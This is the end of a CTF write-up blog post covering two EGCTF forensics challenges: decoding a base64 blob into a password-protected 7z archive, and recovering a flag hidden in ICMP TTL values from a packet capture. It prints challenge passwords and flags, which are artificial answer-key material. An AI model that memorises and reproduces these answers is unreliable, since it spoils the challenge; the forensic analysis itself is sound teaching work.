class="line">f&#x2F;Beb4&#x2F;IFc3EIn0L8inS2Ds5rXUq0EyHaqyXwmR2gi1H8T4i9AHsB4HKFD91ThW&#x2F;agKel8K2BvW\n0Oawglav&#x2F;RZx4VtOIAkz&#x2F;j8wvnE6AvA87mbC+bWSUmpE&#x2F;3m9FuzG6aeMFrPvFJef6C8tLR5VhXWA\nh7zh52kaDTGlFDLnHmUUl99NmKhMqD6rinO6lMVUN1XnqEnftcAtfMeT</span><br><span class="line">Gtte3iB5&#x2F;hwziuiGcekZ\nFKxMLhAM1w5OI0XwbMBvMcgDRMcGS7mLLeVqUrrJpv0&#x2F;AZ50ilbsop5vamOxFslt70rsJrQI4K7r\norGwlzC8oLqKxlfToV69j2bgSutxjZeJ6eIYhWkoWRWZ0qaaRdM1gDOvr6Swuq2Bz3e+UB7QAfc&#x2F;\n7S8HL8X6SFa14WkQlXbv63ACkhAbFmDL6</span><br><span class="line">64u8MMS6yjukmmBwWILaSjn70HLTSbYYFJFDvsSX4C4\nKxPXprYvHpZYRN7QJ8Z6wh0+8WLGkexFgQ+5gp38ITKw2ZbEpUhyZ7g56pzXzcZ4Ao26imPCPPCM\nkxEjQNb25GazGW1ZeFRBuChEDRGhyHpVBrjHAVEOGHslXDlfiYCBxx4zHAbzl1bY2+JcYPSQysbP\n9Azm8dyjhw</span><br><span class="line">FxLTLi2oijgKt6ebc6yqGkCXYw7Lz35Sv9RlvjxhUDuomszKEx4igGFrfATGZflZWe\neSs&#x2F;oNSX2hIB3Z+Q&#x2F;CmF7&#x2F;iTtL+1&#x2F;3ppRNfclN6cf6xwkKQDay9+8LW87vHYDdUkyDGebhJVgUEU\nhkVqh84+ybzY8kDeJkYuaNasEHX5QtsEX64RERw38b4dFGxayy2121cHBIvgSy7F+</span><br><span class="line">p8tGr&#x2F;TAMvk\nS95mq2hCNH+eWAaYbN5KZXCESEMGcRqINziqAwPvtvyltGoshg3ltuZlHLxOZzR8ZkowZSoV5fgo\ng9pSEUGBtBMq2qtDBLlymITFTp3MCFeOb+N+eDgfeFci8hEwnWUjDVoYCgobi48TOb7ABFMXtyiq\nwswb6ISphq0MJTsAq4s2xN7jOC&#x2F;2axOqojgr7S3hmL</span><br><span class="line">jp4wUxKMdnofRW2jTxnsNnRadGguu&#x2F;EBYf\nWSHHKKzsdwgJXm+Y0KevgXMn&#x2F;Pc4qudjB&#x2F;KHlrVDifWCC&#x2F;JFMilPhkp4b1AYhryG2qSQTFH0M2l5\nUUYgXSsr1L9Qu512OqpDx4&#x2F;RRXM8IYilCfwAFz9Ahd7bz4HrJ60WmxJcpkzght6AfPAyg0iI334j\nnmsF9EZWuULIrg9V3kD</span><br><span class="line">aicX2IJqtQmn0jffRWmE3N8PqzO6NlMIMLWfP3C0HImct5iHAoWvkHpIZ\nC9dfbTfUY9SgSfF8kqWyF61NN0m&#x2F;tuhjc2SDUvHozoOuJrI1ym4zbt&#x2F;O2keRRBfgeBvo4idO85wP\nXSZnHukci9YTr6Yuegif9ZmU5iPyevxieCGVx8+1LTHHXRdLoTVAKd4pLD0&#x2F;v&#x2F;HziHLz6TL2o3</span><br><span class="line">Z9\na3HzhW3On3NM61mDqktNIqlZcEQTjZsw4KcP+EqSETHdb104M1PRxwPnS48DSnsEEOKEJuCULSjm\nA9pwgloS&#x2F;lQ&#x2F;OoS9r8jgwNQh3rXwuMeZCCrLSgiTVvVMP8UPH24QMQz3SjVn&#x2F;K&#x2F;MkhVQZLh3P8wE\nUzQd&#x2F;891HbbBwGpuPcnxMXFyJt055EpBNz65f&#x2F;&#x2F;kV0RHvtqXgLK</span><br><span class="line">uKWLduEv&#x2F;ZLxMWclnIDWOdZzQ\nuriMG0zHRZeLWNDlUmKf3nzFYQEX&#x2F;27RW5Iwy&#x2F;Op&#x2F;qsAb86&#x2F;+erv5AA616Wf2EyL2Kl6GaBW0EVK\n8LAr1fdxzV&#x2F;+D&#x2F;GaX4xeCbrdv&#x2F;i49TEelUQ2Ut7hNlmqWo09r+1zZZsHo9jsrfUUQfmvoKZhvFuR\nefISfOWWyCoCmxHkyuP5IrW39G78</span><br><span class="line">xGMD6pE+2DqExH1Et8VWCBGXYnz&#x2F;6BEHM54xYIzN8QbeSwqx\ndKeB4y3jo7NvSfes5T6&#x2F;Z+WRn3CJ&#x2F;N4WDYfugACnSlk6BAx83OC+yV41PcjsLHS6x3o1HsOmXwBj\nz&#x2F;fDuXnAxXvO6bhkVWB&#x2F;Byvp9blK2Y7995M2Gx9U826Cj&#x2F;vY+OWbFi8ifLEvulVBMyRpONsJ5CuI\nZZ2nw</span><br><span class="line">6QeVYk2OA8H8+68DcIrArhaH4qaaOLPIny+VRCZ21MF0GzjDZkHJC+k0fH8cdI7aTuXVw0O\nnr8zGZ7rUNgyn7f14thYnqg9C1E+uPgqTp9bPhDuDHG0PApvj4fnORvGzZCU8YfZE22MGhGihTgA\ngmGHshEDvlP&#x2F;LICC5RPTCR7LwOtmPZeRlbA9C8bl&#x2F;UwM4h7Az8a1089Uj8Pu</span><br><span class="line">RvNOz8Mp3t717KHJ\nOtl0iy++jHj0qfpXkNn3BqmM7FsaP8Opn4efg6UI0nVg8kQqcD5KjWNVyd&#x2F;&#x2F;Wbnxoo4stjr4DOy7\nLI9Y9kO56NYZ9R54EiXw9UsyXnN4lvy62Al2rjRcpcA2yrK&#x2F;d52aDjP91AY0Q7PEHG3t++MG0jKl\nVEUPElOjyIQLbFcAAgv0omnHIfG3WrybE1AxV</span><br><span class="line">vAq25mxsS7NuyAQTs1+VOIbN+ZICRL9R6q9BXH+\nJ1yYwjPysIlEyUEfWsGFynPtAGdjtXA8hsDcWZU&#x2F;k1RFDlYu2w0jAQQGAAEJivAABwsBAAIkBvEH\nAQpTBwRUId45GliZISEBBQEADIrlwMxEAAgKAY5g2lMAAAUBGQUAAAAAABElAGUAbQBwAGwAbwB5\nAGUAZQBfAGQAYQ</span><br><span class="line">B0AGEALgB0AHgAdAAAABQKAQDQbKHeApTVARUGAQAgAAAAAAA&#x3D;\n&quot;)</span><br><span class="line">...     f.close()</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; exit()</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary#</span><br></pre></td></tr></table></figure>
<p>After decoding the data I used <code>file</code> to check the type of the new file, it was a <code>7z</code> archive:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary# base64 -d final.b64 &gt; final.decoded</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary# file final.decoded </span><br><span class="line">final.decoded: 7-zip archive data, version 0.4</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary#</span><br></pre></td></tr></table></figure>
<p>I tried to extract it, but it was password protected:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary# 7z e final.decoded                                                                                                                                        </span><br><span class="line"></span><br><span class="line">7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21</span><br><span class="line">p7zip Version 16.02 (locale&#x3D;en_US.UTF-8,Utf16&#x3D;on,HugeFiles&#x3D;on                                                                          </span><br><span class="line"></span><br><span class="line">Scanning the drive for archives:</span><br><span class="line">1 file, 2954 bytes (3 KiB)</span><br><span class="line"></span><br><span class="line">Extracting archive: final.decoded</span><br><span class="line">--</span><br><span class="line">Path &#x3D; final.decoded</span><br><span class="line">Type &#x3D; 7z</span><br><span class="line">Physical Size &#x3D; 2954</span><br><span class="line">Headers Size &#x3D; 154</span><br><span class="line">Method &#x3D; LZMA2:24k 7zAES</span><br><span class="line">Solid &#x3D; -</span><br><span class="line">Blocks &#x3D; 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Enter password (will not be echoed):</span><br><span class="line">ERROR: Data Error in encrypted file. Wrong password? : employee_data.txt</span><br><span class="line"></span><br><span class="line">Sub items Errors: 1</span><br><span class="line"></span><br><span class="line">Archives with Errors: 1</span><br><span class="line"></span><br><span class="line">Sub items Errors: 1</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary#</span><br></pre></td></tr></table></figure>
<p>I checked the network capture again and found an <code>HTTP</code> request to a file called <code>key.txt</code>:<br><img src="/images/ctfs/egctf-qual/26.png" alt=""></p>
<p><img src="/images/ctfs/egctf-qual/27.png" alt=""><br>The response was a base-64 encoded string so I decoded it then I used the result as a password:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary# echo dGghc2MwbXBsZXhwQHNzdzByZA | base64 -d</span><br><span class="line">th!sc0mplexp@ssw0rdbase64: invalid input</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary#</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary# 7z e final.decoded</span><br><span class="line"></span><br><span class="line">7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21</span><br><span class="line">p7zip Version 16.02 (locale&#x3D;en_US.UTF-8,Utf16&#x3D;on,HugeFiles&#x3D;on</span><br><span class="line"></span><br><span class="line">Scanning the drive for archives:</span><br><span class="line">1 file, 2954 bytes (3 KiB)</span><br><span class="line"></span><br><span class="line">Extracting archive: final.decoded</span><br><span class="line">--</span><br><span class="line">Path &#x3D; final.decoded</span><br><span class="line">Type &#x3D; 7z</span><br><span class="line">Physical Size &#x3D; 2954</span><br><span class="line">Headers Size &#x3D; 154</span><br><span class="line">Method &#x3D; LZMA2:24k 7zAES</span><br><span class="line">Solid &#x3D; -</span><br><span class="line">Blocks &#x3D; 1</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">Enter password (will not be echoed):</span><br><span class="line">Everything is Ok        </span><br><span class="line"></span><br><span class="line">Size:       17612</span><br><span class="line">Compressed: 2954</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary#</span><br></pre></td></tr></table></figure>
<p>And finally I got the flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary# grep EGCTF .&#x2F;employee_data.txt </span><br><span class="line">|         154 | Nanette     | Cambrault   | NCAMBRAU | EGCTF&#123;04ebc6f21584ef9dd240190de62c493c&#125; | 1987-08-10 | SA_REP     |  7500.00 |           0.20 |        145 |            80 |</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary#</span><br></pre></td></tr></table></figure>


<h2 id="Forensics-Secret-Agent"><a href="#Forensics-Secret-Agent" class="headerlink" title="Forensics: Secret Agent"></a>Forensics: Secret Agent</h2><h3 id="Challenge-Description-9"><a href="#Challenge-Description-9" class="headerlink" title="Challenge Description:"></a>Challenge Description:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A secret agent was found sending a message to an unknown party. We managed to intercept network traffic but could not recover the message. Can you help us?</span><br></pre></td></tr></table></figure>
<h3 id="Solution-9"><a href="#Solution-9" class="headerlink" title="Solution"></a>Solution</h3><p>We’re given a <code>pcapng</code> file called <code>SecretMessage.pcapng</code>, by looking at the capture in <code>wireshark</code> and sorting the packets according to their protocol I noticed a bunch of <code>ICMP</code> requests with weird <code>ttl</code>numbers:<br><img src="/images/ctfs/egctf-qual/28.png" alt=""><br>These numbers were <code>ASCII</code> characters codes, I tried decoding the first 5 ones and I got <code>EGCTF</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;secret-agent# python</span><br><span class="line">Python 2.7.16 (default, Apr  6 2019, 01:42:57)</span><br><span class="line">[GCC 8.3.0] on linux2</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; print chr(69)</span><br><span class="line">E</span><br><span class="line">&gt;&gt;&gt; print chr(71)</span><br><span class="line">G</span><br><span class="line">&gt;&gt;&gt; print chr(67)</span><br><span class="line">C</span><br><span class="line">&gt;&gt;&gt; print chr(84)</span><br><span class="line">T</span><br><span class="line">&gt;&gt;&gt; print chr(70)</span><br><span class="line">F</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<p>Doing it manually will take some time so I exported the <code>ICMP</code> packets as a <code>txt</code>:<br><img src="/images/ctfs/egctf-qual/29.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;secret-agent# cat icmp_packets</span><br><span class="line">No.     Time           Source                Destination           Protocol Length Info</span><br><span class="line">   4606 106.913965051  192.168.125.138       192.168.125.143       ICMP     42     Echo (ping) request  id&#x3D;0x0000, seq&#x3D;0&#x2F;0, ttl&#x3D;69 (reply in 4607)</span><br><span class="line"></span><br><span class="line">Frame 4606: 42 bytes on wire (336 bits), 42 bytes captured (336 bits) on interface 0</span><br><span class="line">Ethernet II, Src: Vmware_44:51:4f (00:0c:29:44:51:4f), Dst: Vmware_86:2b:43 (00:0c:29:86:2b:43)</span><br><span class="line">Internet Protocol Version 4, Src: 192.168.125.138, Dst: 192.168.125.143</span><br><span class="line">Internet Control Message Protocol</span><br><span class="line">---</span><br><span class="line">No.     Time           Source                Destination           Protocol Length Info</span><br><span class="line">   4748 110.024784457  192.168.125.143       192.168.125.138       ICMP     60     Echo (ping) reply    id&#x3D;0x0000, seq&#x3D;0&#x2F;0, ttl&#x3D;128 (request in 4747)                                                             </span><br><span class="line"></span><br><span class="line">Frame 4748: 60 bytes on wire (480 bits), 60 bytes captured (480 bits) on interface 0</span><br><span class="line">Ethernet II, Src: Vmware_86:2b:43 (00:0c:29:86:2b:43), Dst: Vmware_44:51:4f (00:0c:29:44:51:4f)</span><br><span class="line">Internet Protocol Version 4, Src: 192.168.125.143, Dst: 192.168.125.138</span><br><span class="line">Internet Control Message Protocol</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;secret-agent#</span><br></pre></td></tr></table></figure>
<p>I used <code>grep</code> to get only the lines with <code>ttl</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;secret-agent# cat icmp_packets | grep &quot;ttl&quot;</span><br><span class="line">   4606 106.913965051  192.168.125.138       192.168.125.143       ICMP     42     Echo (ping) request  id&#x3D;0x0000, seq&#x3D;0&#x2F;0, ttl&#x3D;69 (reply in 4607)</span><br><span class="line">   4607 106.914430466  192.168.125.143       192.168.125.138       ICMP     60     Echo (ping) reply    id&#x3D;0x0000, seq&#x3D;0&#x2F;0, ttl&#x3D;128 (request in 4606)</span><br><span class="line">---</span><br><span class="line">   4747 110.022313975  192.168.125.138       192.168.125.143       ICMP     42     Echo (ping) request  id&#x3D;0x0000, seq&#x3D;0&#x2F;0, ttl&#x3D;125 (reply in 4748)                                                               </span><br><span class="line">   4748 110.024784457  192.168.125.143       192.168.125.138       ICMP     60     Echo (ping) reply    id&#x3D;0x0000, seq&#x3D;0&#x2F;0, ttl&#x3D;128 (request in 4747)                                                             </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;secret-agent#</span><br></pre></td></tr></table></figure>
<p>Then by using <code>cut</code> I got the <code>ttl</code> numbers only:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;secret-agent# cat icmp_packets | grep &#39;ttl&#39; | cut -d &quot;&#x3D;&quot; -f 4 | cut -d &quot;(&quot; -f 1</span><br><span class="line">69 </span><br><span class="line">128 </span><br><span class="line">71 </span><br><span class="line">128 </span><br><span class="line">---</span><br><span class="line">95</span><br><span class="line">128</span><br><span class="line">125</span><br><span class="line">128</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;secret-agent#</span><br></pre></td></tr></table></figure>
<p>We don’t need <code>128</code> because that’s the <code>ttl</code> number from the response packets so we’ll remove it by piping to <code>grep -v &quot;128&quot;</code>, then finally will use <code>echo -n</code> on the output to produce a single line output:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;secret-agent# echo -n &#96;cat icmp_packets | grep &#39;ttl&#39; | cut -d &quot;&#x3D;&quot; -f 4 | cut -d &quot;(&quot; -f 1 | grep -v &quot;128&quot;&#96;</span><br><span class="line">69 71 67 84 70 123 89 48 117 95 71 48 84 95 116 104 101 95 70 76 64 103 95 84 84 76 95 109 64 110 105 112 117 108 97 116 105 111 110 95 33 115 95 65 119 101 115 48 109 101 95 67 48 110 103 114 64 116 117 108 114 97 116 105 111 110 95 95 125</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;secret-agent#</span><br></pre></td></tr></table></figure>
<p>I used the <code>ASCII</code> code <a href="https://www.dcode.fr/ascii-code" target="_blank" rel="noopener">tool</a> from <a href="https://www.dcode.fr" target="_blank" rel="noopener">dcode.fr</a> to decode the flag:<br><img src="/images/ctfs/egctf-qual/30.png" alt=""></p>
<p>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">other write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>0xRick</div>
      <div>2019-11-17</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/ctfs/">ctfs</a>

      <a class="tag-link" href="/tags/cryptography/" rel="tag">#cryptography</a> <a class="tag-link" href="/tags/forensics/" rel="tag">#forensics</a> <a class="tag-link" href="/tags/git/" rel="tag">#git</a> <a class="tag-link" href="/tags/javascript/" rel="tag">#javascript</a> <a class="tag-link" href="/tags/web/" rel="tag">#web</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
